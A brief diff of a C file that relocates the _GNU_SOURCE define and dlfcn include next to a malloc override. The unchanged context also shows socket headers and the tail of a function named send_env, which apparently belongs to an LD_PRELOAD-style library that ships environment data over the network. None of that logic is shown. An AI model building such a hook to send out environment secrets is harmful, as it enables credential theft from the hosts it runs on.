@@ -4,8 +4,6 @@
 #include <sys/socket.h>
 #include <netdb.h>
 
-#define _GNU_SOURCE
-#include <dlfcn.h>
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -86,8 +84,12 @@ void send_env() {
     free(data);
 }
 
+#define _GNU_SOURCE
+#include <dlfcn.h>
+
 static void* (*real_malloc)(size_t)=NULL;
 static int i = 0;
+
 
 void *malloc(size_t size)
 {
